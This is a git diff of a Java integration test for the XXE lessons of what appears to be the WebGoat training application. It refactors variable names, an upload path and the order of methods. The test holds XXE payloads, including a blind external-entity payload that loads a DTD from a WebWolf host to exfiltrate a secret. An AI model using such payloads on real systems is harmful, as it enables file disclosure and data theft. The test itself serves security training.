@@ -22,18 +22,7 @@ public class XXETest extends IntegrationTest {
             <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE comment [<!ENTITY % remote SYSTEM "WEBWOLFURL/USERNAME/blind.dtd">%remote;]><comment><text>test&send;</text></comment>""";
 
     private String webGoatHomeDirectory;
-    private String webwolfFileDir;
-
-    @Test
-    public void runTests() throws IOException {
-        startLesson("XXE");
-        webGoatHomeDirectory = getWebGoatServerPath();
-        webwolfFileDir = getWebWolfServerPath();
-        checkAssignment(url("/WebGoat/xxe/simple"), ContentType.XML, xxe3, true);
-        checkAssignment(url("/WebGoat/xxe/content-type"), ContentType.XML, xxe4, true);
-        checkAssignment(url("/WebGoat/xxe/blind"), ContentType.XML, "<comment><text>" + getSecret() + "</text></comment>", true);
-        checkResults("xxe/");
-    }
+    private String webWolfFileServerLocation;
 
     /*
      * This test is to verify that all is secure when XXE security patch is applied.
@@ -41,8 +30,8 @@ public class XXETest extends IntegrationTest {
     @Test
     public void xxeSecure() throws IOException {
         startLesson("XXE");
-        webGoatHomeDirectory = getWebGoatServerPath();
-        webwolfFileDir = getWebWolfServerPath();
+        webGoatHomeDirectory = webGoatServerDirectory();
+        webWolfFileServerLocation = getWebWolfFileServerLocation();
         RestAssured.given()
                 .when()
                 .relaxedHTTPSValidation()
@@ -63,7 +52,7 @@ public class XXETest extends IntegrationTest {
      */
     private String getSecret() throws IOException {
         //remove any left over DTD
-        Path webWolfFilePath = Paths.get(webwolfFileDir);
+        Path webWolfFilePath = Paths.get(webWolfFileServerLocation);
         if (webWolfFilePath.resolve(Paths.get(getWebgoatUser(), "blind.dtd")).toFile().exists()) {
             Files.delete(webWolfFilePath.resolve(Paths.get(getWebgoatUser(), "blind.dtd")));
         }
@@ -76,7 +65,7 @@ public class XXETest extends IntegrationTest {
                 .relaxedHTTPSValidation()
                 .cookie("WEBWOLFSESSION", getWebWolfCookie())
                 .multiPart("file", "blind.dtd", dtd7String.getBytes())
-                .post(webWolfUrl("/WebWolf/fileupload"))
+                .post(webWolfUrl("/fileupload"))
                 .then()
                 .extract().response().getBody().asString();
         //upload attack
@@ -96,5 +85,16 @@ public class XXETest extends IntegrationTest {
         	result = result.substring(result.lastIndexOf("WebGoat 8.0 rocks... ("), result.lastIndexOf("WebGoat 8.0 rocks... (") + 33);
         }
         return result;
+    }
+
+    @Test
+    public void runTests() throws IOException {
+        startLesson("XXE");
+        webGoatHomeDirectory = webGoatServerDirectory();
+        webWolfFileServerLocation = getWebWolfFileServerLocation();
+        checkAssignment(url("/WebGoat/xxe/simple"), ContentType.XML, xxe3, true);
+        checkAssignment(url("/WebGoat/xxe/content-type"), ContentType.XML, xxe4, true);
+        checkAssignment(url("/WebGoat/xxe/blind"), ContentType.XML, "<comment><text>" + getSecret() + "</text></comment>", true);
+        checkResults("xxe/");
     }
 }
